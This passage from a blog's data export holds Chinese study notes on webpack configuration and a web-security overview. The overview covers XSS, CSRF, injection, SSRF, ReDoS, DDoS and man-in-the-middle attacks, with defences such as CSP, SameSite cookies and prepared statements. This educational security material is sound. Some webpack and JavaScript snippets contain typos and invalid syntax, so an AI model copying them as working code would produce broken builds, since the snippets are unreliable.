class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> path=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;path&#x27;</span>);<br><br><span class=\"hljs-variable language_\">module</span>.<span class=\"hljs-property\">exports</span>=&#123;<br>    <span class=\"hljs-attr\">entry</span>:<span class=\"hljs-string\">&#x27;./src/index&#x27;</span>,\t<span class=\"hljs-comment\">//定义当前项目的入口</span><br>    <span class=\"hljs-attr\">output</span>:&#123;<br>        <span class=\"hljs-attr\">filename</span>:<span class=\"hljs-string\">&#x27;[name].js&#x27;</span>,\t\t\t<span class=\"hljs-comment\">//定义打包后文件的名称；</span><br>        <span class=\"hljs-attr\">path</span>:path.<span class=\"hljs-title function_\">join</span>(_dirname,<span class=\"hljs-string\">&#x27;./dist&#x27;</span>)<br>    &#125;，<br>    <span class=\"hljs-attr\">module</span>:&#123;<br>    \t<span class=\"hljs-comment\">//css处理器</span><br>    \t<span class=\"hljs-attr\">rules</span>:[&#123;<br>           \t\t<span class=\"hljs-attr\">test</span>:<span class=\"hljs-regexp\">/\\/js$/</span>,<br>    \t\t\t<span class=\"hljs-attr\">user</span>:[<br>    \t\t\t\t\t<span class=\"hljs-attr\">loader</span>:<span class=\"hljs-string\">&#x27;babel-loader&#x27;</span>,<br>    \t\t\t\t\t<span class=\"hljs-attr\">options</span>:&#123;<br>    \t\t\t\t\t\t\t<span class=\"hljs-attr\">presets</span>:[<br>    \t\t\t\t\t\t\t[<span class=\"hljs-string\">&#x27;@babel/preset-env&#x27;</span>]<br>                                ]<br>                            &#125;<br>                     ]<br>            ]<br>        &#125;]<br>\t&#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>执行<code>npx webpack</code></li>\n</ul>\n<h5 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h5><ul>\n<li>Babel具体由什么功能？</li>\n<li>Babel与Webpack分别解决了什么问题？为何两者能协作到一块儿？</li>\n</ul>\n<h3 id=\"5-生成HTML\"><a href=\"#5-生成HTML\" class=\"headerlink\" title=\"5.生成HTML\"></a>5.生成HTML</h3><blockquote>\n<p>自动生成HTML文件；</p>\n</blockquote>\n<ul>\n<li>安装依赖</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">npm i -D html-webpack-plugin<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>声明产物出口<code>output</code></li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> path=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;path&#x27;</span>);<br><br><span class=\"hljs-variable language_\">module</span>.<span class=\"hljs-property\">exports</span>=&#123;<br>    <span class=\"hljs-attr\">entry</span>:<span class=\"hljs-string\">&#x27;./src/index&#x27;</span>,\t<span class=\"hljs-comment\">//定义当前项目的入口</span><br>    <span class=\"hljs-attr\">output</span>:&#123;<br>        <span class=\"hljs-attr\">filename</span>:<span class=\"hljs-string\">&#x27;[name].js&#x27;</span>,\t\t\t<span class=\"hljs-comment\">//定义打包后文件的名称；</span><br>        <span class=\"hljs-attr\">path</span>:path.<span class=\"hljs-title function_\">join</span>(_dirname,<span class=\"hljs-string\">&#x27;./dist&#x27;</span>)<br>    &#125;，<br>    <span class=\"hljs-attr\">plugins</span>:[<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">HtmlWebpackPlugin</span>()]<br>&#125;;<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>执行<code>npx webpack</code></li>\n</ul>\n<h5 id=\"问题-1\"><a href=\"#问题-1\" class=\"headerlink\" title=\"问题\"></a>问题</h5><ul>\n<li>相比于手工维护HTML内容，这张方式有什么优缺点？</li>\n</ul>\n<h2 id=\"四、使用web-pack–工具类\"><a href=\"#四、使用web-pack–工具类\" class=\"headerlink\" title=\"四、使用web pack–工具类\"></a>四、使用web pack–工具类</h2><h3 id=\"1-HMR-Hot-Module-Replacement\"><a href=\"#1-HMR-Hot-Module-Replacement\" class=\"headerlink\" title=\"1. HMR Hot Module Replacement\"></a>1. HMR Hot Module Replacement</h3><blockquote>\n<p>模块热替换，写完的代码能立刻更新到页面；</p>\n</blockquote>\n<ul>\n<li><p>开启HMR</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-attr\">devServer</span>:&#123;<br>\t<span class=\"hljs-attr\">hot</span>:<span class=\"hljs-literal\">true</span>,<br>\t<span class=\"hljs-attr\">open</span>:<span class=\"hljs-literal\">true</span><br>&#125;,<br><span class=\"hljs-attr\">module</span>:&#123;<br>    <br>&#125;,<br><span class=\"hljs-attr\">watch</span>:<span class=\"hljs-literal\">true</span><br></code></pre></td></tr></table></figure></li>\n<li><p>启动Webpack</p>\n</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">npx webpack serve<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-Tree-shaking\"><a href=\"#2-Tree-shaking\" class=\"headerlink\" title=\"2.Tree-shaking\"></a>2.Tree-shaking</h3><blockquote>\n<p>删除没有使用到的代码</p>\n</blockquote>\n<ul>\n<li>Dead Code：代码没有被用到，不可到达；代码的执行结果不会被用到；代码只读不写；</li>\n<li>Tree-shaking：模块导出了但是没被使用；</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-attr\">mode</span>:<span class=\"hljs-string\">&quot;production&quot;</span>,<br><span class=\"hljs-attr\">optimization</span>:&#123;<br><span class=\"hljs-attr\">usedExports</span>:<span class=\"hljs-literal\">true</span>,<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"五、其他工具\"><a href=\"#五、其他工具\" class=\"headerlink\" title=\"五、其他工具\"></a>五、其他工具</h2><ul>\n<li>缓存</li>\n<li>Sourcemap</li>\n<li>性能监控</li>\n<li>日志</li>\n<li>代码压缩</li>\n<li>分包</li>\n<li>…</li>\n</ul>\n<h2 id=\"六、理解Loader\"><a href=\"#六、理解Loader\" class=\"headerlink\" title=\"六、理解Loader\"></a>六、理解Loader</h2><h3 id=\"1-Webpack只认识JS\"><a href=\"#1-Webpack只认识JS\" class=\"headerlink\" title=\"1.Webpack只认识JS\"></a>1.Webpack只认识JS</h3><blockquote>\n<p>为了处理非标准JS资源，设计出资源翻译模块—Loader</p>\n<p>用于将资源翻译为标准JS</p>\n</blockquote>\n<h3 id=\"2-使用loader\"><a href=\"#2-使用loader\" class=\"headerlink\" title=\"2.使用loader\"></a>2.使用loader</h3><ul>\n<li>安装依赖</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">npm add -D css-loader style-loader less-loader<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>添加<code>module</code>处理css文件</li>\n</ul>\n<h3 id=\"3-认识loader：链式调用\"><a href=\"#3-认识loader：链式调用\" class=\"headerlink\" title=\"3.认识loader：链式调用\"></a>3.认识loader：链式调用</h3><ul>\n<li>less-loader：将less=&gt;css;</li>\n<li>css-loader：将css包装成类似module.exports=”${css}”的内容，包装后的内容符合JS语法；</li>\n<li>style-loader：将css模块包进require语句，并在运行时调用injectStyle等函数将内容注入到页面的style标签；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/08/d65b92e7cb18342c.jpg\"></p>\n<h3 id=\"4-loader特点\"><a href=\"#4-loader特点\" class=\"headerlink\" title=\"4.loader特点\"></a>4.loader特点</h3><ul>\n<li>链式执行；</li>\n<li>支持异步执行；</li>\n<li>分normal、patch两种模式；</li>\n</ul>\n<h3 id=\"5-常见loader\"><a href=\"#5-常见loader\" class=\"headerlink\" title=\"5.常见loader\"></a>5.常见loader</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/08/fe2e05bc32513a45.jpg\"></p>\n<h5 id=\"问题-2\"><a href=\"#问题-2\" class=\"headerlink\" title=\"问题\"></a>问题</h5><ul>\n<li>Loader是什么？要求的输出是什么？</li>\n<li>Loader的链式调用是什么意思？如何串联多个loader？</li>\n<li>Loader中如何处理异步场景？</li>\n</ul>\n<h2 id=\"七、理解插件\"><a href=\"#七、理解插件\" class=\"headerlink\" title=\"七、理解插件\"></a>七、理解插件</h2><blockquote>\n<p>很多知名工具，如vscode、chrome、vue等都涉及了所谓的“插件架构“为什么？</p>\n</blockquote>\n<ul>\n<li>心智成本高=&gt;可维护性低=&gt;生命力弱</li>\n<li>插件架构精髓：对拓展开发，对修改封闭；</li>\n<li>Webpack很多功能都是基于插件的概念实现；</li>\n</ul>\n<h3 id=\"1-使用插件\"><a href=\"#1-使用插件\" class=\"headerlink\" title=\"1.使用插件\"></a>1.使用插件</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//引入插件</span><br><span class=\"hljs-keyword\">const</span> <span class=\"hljs-title class_\">DashboardPlugin</span>=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;webpack-dashboard/plugin&#x27;</span>);<br><br><span class=\"hljs-variable language_\">module</span>.<span class=\"hljs-property\">exports</span>=&#123;<br>    <span class=\"hljs-comment\">//添加插件实例</span><br>    <span class=\"hljs-attr\">plugins</span>:[<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">DashboardPlugin</span>()];<br>&#125;;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-编写插件\"><a href=\"#2-编写插件\" class=\"headerlink\" title=\"2.编写插件\"></a>2.编写插件</h3><h5 id=\"钩子\"><a href=\"#钩子\" class=\"headerlink\" title=\"钩子\"></a>钩子</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">SomePlugin</span>&#123;<br>    <span class=\"hljs-title function_\">apply</span>(<span class=\"hljs-params\">complier</span>)&#123;<br>        complier.<span class=\"hljs-property\">hooks</span>.<span class=\"hljs-property\">thisCompilation</span>.<span class=\"hljs-title function_\">tap</span>(<span class=\"hljs-string\">&#x27;SomePlugin&#x27;</span>,<span class=\"hljs-function\">(<span class=\"hljs-params\">compilation</span>)=&gt;</span>&#123;<br>            <br>        &#125;)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>时机：编译过程的特定节点，webpack会以钩子的形式通知插件此刻正在发生什么事；</li>\n<li>上下文：通过tapable提供的回调机制，以参数的方式传递上下文信息；</li>\n<li>交互：在上下文参数对象中附带了很多存在side effect 的交互接口，插件可以通过这些接口改变；</li>\n</ul>\n<h5 id=\"问题-3\"><a href=\"#问题-3\" class=\"headerlink\" title=\"问题\"></a>问题</h5><ul>\n<li>Loader与插件有什么区同点？</li>\n<li>钩子有什么作用？如何监听钩子函数？</li>\n</ul>\n<h2 id=\"八、学习方法\"><a href=\"#八、学习方法\" class=\"headerlink\" title=\"八、学习方法\"></a>八、学习方法</h2><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/08/979e56c5c207eac0.jpg\"></p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/08/452e2397f71ff64e.jpg\"></p>\n"},{"title":"Web开发安全","date":"2023-03-27T10:51:45.000Z","mp3":null,"cover":"img/bg1.jpg","_content":"\n\n\n# Web开发安全\n\n# 攻击篇\n\n## 一、Cross-site Scripting(XSS)跨站脚本攻击\n\n### 1.主要利用点\n\n- 盲目信任用户的提交内容；\n- string->Dom\n\n```js\ndoucument.write\nelement.innerHTML=anyString\nSSR(user_data)\t//伪代码\n```\n\n### 2.特点\n\n- 很难从UI感知；\n- 窃取用户信息（Cookie/token）；\n- 绘制UI（例如弹窗），诱骗用户点击/填写表单；\n\n![](https://s3.bmp.ovh/imgs/2023/02/06/bab761782d523687.jpg)\n\n### 3.类别\n\n- stored XSS（存储型xss）\n\n```\n-恶意脚本被存储在数据库中\n-访问页面->读数据->被攻击\n-危害最大，对全部用户可见\n```\n\n- reflected XSS (反射型xss)\n\n```\n-不涉及数据库\n-从URL攻击\n```\n\n![](https://s3.bmp.ovh/imgs/2023/02/06/01aa21181b743218.jpg)\n\n- DOM-based XSS\n\n```\n-不需要服务器参与\n-恶意攻击的发起+执行，全部在浏览器完成\n```\n\n![](https://s3.bmp.ovh/imgs/2023/02/06/8f74704368f2a414.jpg)\n\n![](https://s3.bmp.ovh/imgs/2023/02/06/83dda8008e3c1b19.jpg)\n\n- Mutation-based XSS \n\n```\n-利用浏览器渲染DOM的特性（独特优化）\n-不同的浏览器，会有区别（按照浏览器进行攻击）\n```\n\n![](https://s3.bmp.ovh/imgs/2023/02/06/2db16e9e30d05689.jpg)\n\nNote：其实就是闭合双引号；\n\n## 二、Cross-site request forgery(CSRF)跨站伪造请求\n\n### 1.特点\n\n- 在用户不知情的前提下\n- 利用用户权限Cookie\n- 构造指定HTTP请求，窃取或者修改用户敏感信息\n\n![](https://s3.bmp.ovh/imgs/2023/02/06/1cb69b1cdfc1f80f.jpg)\n\n### 2.Get请求\n\n![](https://s3.bmp.ovh/imgs/2023/02/06/315569b1ad5267c7.jpg)\n\n## 三、注入\n\n### 1.SQL Injection\n\n![](https://s3.bmp.ovh/imgs/2023/02/06/bdfe27a1758bff45.jpg)\n\n![](https://s3.bmp.ovh/imgs/2023/02/06/d8d8412ddb795269.png) \n\n### 2.更多注入\n\n- CLI\n- OS command\n- Server-side Request Forgery(SSRF),服务端伪造请求；严格来说并不是注入，但是原理类似；\n\n![](https://s3.bmp.ovh/imgs/2023/02/06/c853331fa801b755.jpg)\n\n##### 读取+修改\n\n![](https://s3.bmp.ovh/imgs/2023/02/06/d326f66d918f6e14.jpg)\n\nSSRF Demo\n\n![](https://s3.bmp.ovh/imgs/2023/02/06/730fd31cf9f769ca.jpg)\n\n## 四、DOS\n\n> 通过某种方式（构造特定请求），导致服务器资源被消耗殆尽，来不及响应更多请求，导致请求被挤压，进而形成雪崩效应；\n\n### 1.正则表达式------贪婪模式\n\n```js\nconst greedyRegExp=/a+/;\nconst noGreedyRegExp=/a+?/;\nconst str='aaaaaaa';\n\nresult1=str.match(greedyRegExp)[0];\t\t\t// \"aaaaaaa\"\nresult2=str.match(noGreedyRegExp)[0];\t\t// \"a\"\n\n```\n\n### 2.ReDOS 基于正则表达式的DoS\n\n![](https://s3.bmp.ovh/imgs/2023/02/06/c28283945d9c0451.jpg)\n\n### 3.DDos\n\n> 短时间内，来自大量僵尸设备的请求流量，服务器不能及时完成全部请求，导致请求堆积；\n\n##### Logical DOS\n\n- 耗时的同步操作\n- 数据库写入\n- SQL join\n- 文件备份\n- 循环执行逻辑\n\n![](https://s3.bmp.ovh/imgs/2023/02/06/bade294c53a9fd51.jpg)\n\n## 五、中间人攻击\n\n![](https://pic.imgdb.cn/item/63e069224757feff33a5d839.jpg)\n\n# 防御篇\n\n## 一、XSS\n\n### 1.防御方法\n\n##### 原则\n\n- 永远不要相信用户的提交内容\n- 永远不要将用户提交的内容转换为DOM\n\n##### 前端\n\n- 主流框架默认防御XSS\n- googole-closure-library\n\n##### 服务端（Node）\n\n- DOMPurify\n\n##### 业务需要用户生成DOM\n\n- 需要对string进行转义\n- 上传的svg文件需要进行扫描\n- Blob动态生成script\n- 自定义样式（自定义背景图片，url）\n\n### 2.同源策略\n\n- 协议、域名、端口号完全相同；\n\n### 3.CSP（content security policy）\n\n- 那些源认为是安全的\n- 对来自安全源的脚本可以执行，否则直接抛错\n- 对eval+inline script 说No！！！！\n\n![](https://pic.imgdb.cn/item/63e06b684757feff33a91d70.jpg)\n\n## 二、CSRF\n\n![](https://pic.imgdb.cn/item/63e06ba14757feff33a96e53.jpg)\n\n##### token\n\n![](https://pic.imgdb.cn/item/63e06bed4757feff33a9e138.jpg)\n\n##### iFrame攻击\n\n![](https://pic.imgdb.cn/item/63e06cac4757feff33aaec65.jpg)\n\n> button是none的，所以点击button下穿到了底下的iframe页面；\n\n##### anti-pattern\n\n```js\n//GET!==GET+POST\n//将更新+获取放到同一个GET接口；\npulic async getAndUpdate(ctx){\n    const{update,id}=ctx.query;\n    if(update){\n        await this.update(update);\n    }\n    ctx.body=await this.get(id);\n}\n```\n\n##### 避免用户信息被携带：same site cookie\n\n![](https://pic.imgdb.cn/item/63e06e0e4757feff33ad8660.jpg)\n\n![](https://pic.imgdb.cn/item/63e06e224757feff33adb6f3.jpg)\n\n##### 问题：第三方服务依赖于cookie怎么办？\n\n```\nSet-Cookie:SameSite=None;Secure;\n```\n\n![](https://pic.imgdb.cn/item/63e06eb34757feff33aec45d.jpg)\n\n## 三、Injection\n\n- 找到查询SQL的地方\n- 使用prapared statement\n- 最小权限原则：禁止sudo || root\n- 建立允许名单+过滤：禁止rm\n- 对URL类型参数进行协议、域名、ip等限制：禁止访问内网\n\n## 四、DOS\n\n### 1.RegexDos\n\n- code review\n- code scan+正则性能测试\n- 禁止使用用户提供的正则\n\n### 2.DDoS\n\n- 流量治理：负载均衡、API网关、CDN （过滤）\n- 快速自动扩容        (抗量)\n- 非核心服务降级  （抗量）\n\n### 3.中间人\n\n![](https://pic.imgdb.cn/item/63e070324757feff33b1206f.jpg)\n\n- 可靠：加密\n- 完整：MAC校验\n- 不可抵赖：数字签名\n\n### 4.SRI  子资源集成\n\n静态资源被劫持篡改？\n\n对比Hash !!!\n\n![](https://pic.imgdb.cn/item/63e071574757feff33b2d91a.jpg)\n\n\n\n\n\n\n\n","source":"_posts/web开发安全.md","raw":"---\ntitle: Web开发安全\ndate: 2023-03-27 18:51:45\ncategories: \n    - 前端\ntags: \n    - 网络安全\n    - 笔记\nmp3: \ncover: img/bg1.jpg\n---\n\n\n\n# Web开发安全\n\n# 攻击篇\n\n## 一、Cross-site Scripting(XSS)跨站脚本攻击\n\n### 1.主要利用点\n\n- 盲目信任用户的提交内容；\n- string->Dom\n\n```js\ndoucument.write\nelement.innerHTML=anyString\nSSR(user_data)\t//伪代码\n```\n\n### 2.特点\n\n- 很难从UI感知；\n- 窃取用户信息（Cookie/token）；\n- 绘制UI（例如弹窗），诱骗用户点击/填写表单；\n\n![](https://s3.bmp.ovh/imgs/2023/02/06/bab761782d523687.jpg)\n\n### 3.类别\n\n- stored XSS（存储型xss）\n\n```\n-恶意脚本被存储在数据库中\n-访问页面->读数据->被攻击\n-危害最大，对全部用户可见\n```\n\n- reflected XSS (反射型xss)\n\n```\n-不涉及数据库\n-从URL攻击\n```\n\n![](https://s3.bmp.ovh/imgs/2023/02/06/01aa21181b743218.jpg)\n\n- DOM-based XSS\n\n```\n-不需要服务器参与\n-恶意攻击的发起+执行，全部在浏览器完成\n```\n\n![](https://s3.bmp.ovh/imgs/2023/02/06/8f74704368f2a414.jpg)\n\n![](https://s3.bmp.ovh/imgs/2023/02/06/83dda8008e3c1b19.jpg)\n\n- Mutation-based XSS \n\n```\n-利用浏览器渲染DOM的特性（独特优化）\n-不同的浏览器，会有区别（按照浏览器进行攻击）\n```\n\n![](https://s3.bmp.ovh/imgs/2023/02/06/2db16e9e30d05689.jpg)\n\nNote：其实就是闭合双引号；\n\n## 二、Cross-site request forgery(CSRF)跨站伪造请求\n\n### 1.特点\n\n- 在用户不知情的前提下\n- 利用用户权限Cookie\n- 构造指定HTTP请求，窃取或者修改用户敏感信息\n\n![](https://s3.bmp.ovh/imgs/2023/02/06/1cb69b1cdfc1f80f.jpg)\n\n### 2.Get请求\n\n![](https://s3.bmp.ovh/imgs/2023/02/06/315569b1ad5267c7.jpg)\n\n## 三、注入\n\n### 1.SQL Injection\n\n![](https://s3.bmp.ovh/imgs/2023/02/06/bdfe27a1758bff45.jpg)\n\n![](https://s3.bmp.ovh/imgs/2023/02/06/d8d8412ddb795269.png) \n\n### 2.更多注入\n\n- CLI\n- OS command\n- Server-side Request Forgery(SSRF),服务端伪造请求；严格来说并不是注入，但是原理类似；\n\n![](https://s3.bmp.ovh/imgs/2023/02/06/c853331fa801b755.jpg)\n\n##### 读取+修改\n\n![](https://s3.bmp.ovh/imgs/2023/02/06/d326f66d918f6e14.jpg)\n\nSSRF Demo\n\n![](https://s3.bmp.ovh/imgs/2023/02/06/730fd31cf9f769ca.jpg)\n\n## 四、DOS\n\n> 通过某种方式（构造特定请求），导致服务器资源被消耗殆尽，来不及响应更多请求，导致请求被挤压，进而形成雪崩效应；\n\n### 1.正则表达式------贪婪模式\n\n```js\nconst greedyRegExp=/a+/;\nconst noGreedyRegExp=/a+?/;\nconst str='aaaaaaa';\n\nresult1=str.match(greedyRegExp)[0];\t\t\t// \"aaaaaaa\"\nresult2=str.match(noGreedyRegExp)[0];\t\t// \"a\"\n\n```\n\n### 2.ReDOS 基于正则表达式的DoS\n\n![](https://s3.bmp.ovh/imgs/2023/02/06/c28283945d9c0451.jpg)\n\n### 3.DDos\n\n> 短时间内，来自大量僵尸设备的请求流量，服务器不能及时完成全部请求，导致请求堆积；\n\n##### Logical DOS\n\n- 耗时的同步操作\n- 数据库写入\n- SQL join\n- 文件备份\n- 循环执行逻辑\n\n![](https://s3.bmp.ovh/imgs/2023/02/06/bade294c53a9fd51.jpg)\n\n## 五、中间人攻击\n\n![](https://pic.imgdb.cn/item/63e069224757feff33a5d839.jpg)\n\n# 防御篇\n\n## 一、XSS\n\n### 1.防御方法\n\n##### 原则\n\n- 永远不要相信用户的提交内容\n- 永远不要将用户提交的内容转换为DOM\n\n##### 前端\n\n- 主流框架默认防御XSS\n- googole-closure-library\n\n##### 服务端（Node）\n\n- DOMPurify\n\n##### 业务需要用户生成DOM\n\n- 需要对string进行转义\n- 上传的svg文件需要进行扫描\n- Blob动态生成script\n- 自定义样式（自定义背景图片，url）\n\n### 2.同源策略\n\n- 协议、域名、端口号完全相同；\n\n### 3.CSP（content security policy）\n\n- 那些源认为是安全的\n- 对来自安全源的脚本可以执行，否则直接抛错\n- 对eval+inline script 说No！！！！\n\n![](https://pic.imgdb.cn/item/63e06b684757feff33a91d70.jpg)\n\n## 二、CSRF\n\n![](https://pic.imgdb.cn/item/63e06ba14757feff33a96e53.jpg)\n\n##### token\n\n![](https://pic.imgdb.cn/item/63e06bed4757feff33a9e138.jpg)\n\n##### iFrame攻击\n\n![](https://pic.imgdb.cn/item/63e06cac4757feff33aaec65.jpg)\n\n> button是none的，所以点击button下穿到了底下的iframe页面；\n\n##### anti-pattern\n\n```js\n//GET!==GET+POST\n//将更新+获取放到同一个GET接口；\npulic async getAndUpdate(ctx){\n    const{update,id}=ctx.query;\n    if(update){\n        await this.update(update);\n    }\n    ctx.body=await this.get(id);\n}\n```\n\n##### 避免用户信息被携带：same site cookie\n\n![](https://pic.imgdb.cn/item/63e06e0e4757feff33ad8660.jpg)\n\n![](https://pic.imgdb.cn/item/63e06e224757feff33adb6f3.jpg)\n\n##### 问题：第三方服务依赖于cookie怎么办？\n\n```\nSet-Cookie:SameSite=None;Secure;\n```\n\n![](https://pic.imgdb.cn/item/63e06eb34757feff33aec45d.jpg)\n\n## 三、Injection\n\n- 找到查询SQL的地方\n- 使用prapared statement\n- 最小权限原则：禁止sudo || root\n- 建立允许名单+过滤：禁止rm\n- 对URL类型参数进行协议、域名、ip等限制：禁止访问内网\n\n## 四、DOS\n\n### 1.RegexDos\n\n- code review\n- code scan+正则性能测试\n- 禁止使用用户提供的正则\n\n### 2.DDoS\n\n- 流量治理：负载均衡、API网关、CDN （过滤）\n- 快速自动扩容        (抗量)\n- 非核心服务降级  （抗量）\n\n### 3.中间人\n\n![](https://pic.imgdb.cn/item/63e070324757feff33b1206f.jpg)\n\n- 可靠：加密\n- 完整：MAC校验\n- 不可抵赖：数字签名\n\n### 4.SRI  子资源集成\n\n静态资源被劫持篡改？\n\n对比Hash !!!\n\n![](https://pic.imgdb.cn/item/63e071574757feff33b2d91a.jpg)\n\n\n\n\n\n\n\n","slug":"web开发安全","published":1,"updated":"2023-03-27T11:01:31.701Z","_id":"clg29vyhs004sao9c8852asaj","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"Web开发安全\"><a href=\"#Web开发安全\" class=\"headerlink\" title=\"Web开发安全\"></a>Web开发安全</h1><h1 id=\"攻击篇\"><a href=\"#攻击篇\" class=\"headerlink\" title=\"攻击篇\"></a>攻击篇</h1><h2 id=\"一、Cross-site-Scripting-XSS-跨站脚本攻击\"><a href=\"#一、Cross-site-Scripting-XSS-跨站脚本攻击\" class=\"headerlink\" title=\"一、Cross-site Scripting(XSS)跨站脚本攻击\"></a>一、Cross-site Scripting(XSS)跨站脚本攻击</h2><h3 id=\"1-主要利用点\"><a href=\"#1-主要利用点\" class=\"headerlink\" title=\"1.主要利用点\"></a>1.主要利用点</h3><ul>\n<li>盲目信任用户的提交内容；</li>\n<li>string-&gt;Dom</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\">doucument.<span class=\"hljs-property\">write</span><br>element.<span class=\"hljs-property\">innerHTML</span>=anyString<br><span class=\"hljs-title function_\">SSR</span>(user_data)\t<span class=\"hljs-comment\">//伪代码</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-特点\"><a href=\"#2-特点\" class=\"headerlink\" title=\"2.特点\"></a>2.特点</h3><ul>\n<li>很难从UI感知；</li>\n<li>窃取用户信息（Cookie/token）；</li>\n<li>绘制UI（例如弹窗），诱骗用户点击/填写表单；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/06/bab761782d523687.jpg\"></p>\n<h3 id=\"3-类别\"><a href=\"#3-类别\" class=\"headerlink\" title=\"3.类别\"></a>3.类别</h3><ul>\n<li>stored XSS（存储型xss）</li>\n</ul>\n<figure class=\"highlight diff\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs diff\"><span class=\"hljs-deletion\">-恶意脚本被存储在数据库中</span><br><span class=\"hljs-deletion\">-访问页面-&gt;读数据-&gt;被攻击</span><br><span class=\"hljs-deletion\">-危害最大，对全部用户可见</span><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>reflected XSS (反射型xss)</li>\n</ul>\n<figure class=\"highlight diff\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs diff\"><span class=\"hljs-deletion\">-不涉及数据库</span><br><span class=\"hljs-deletion\">-从URL攻击</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/06/01aa21181b743218.jpg\"></p>\n<ul>\n<li>DOM-based XSS</li>\n</ul>\n<figure class=\"highlight diff\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs diff\"><span class=\"hljs-deletion\">-不需要服务器参与</span><br><span class=\"hljs-deletion\">-恶意攻击的发起+执行，全部在浏览器完成</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/06/8f74704368f2a414.jpg\"></p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/06/83dda8008e3c1b19.jpg\"></p>\n<ul>\n<li>Mutation-based XSS </li>\n</ul>\n<figure class=\"highlight diff\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs diff\"><span class=\"hljs-deletion\">-利用浏览器渲染DOM的特性（独特优化）</span><br><span 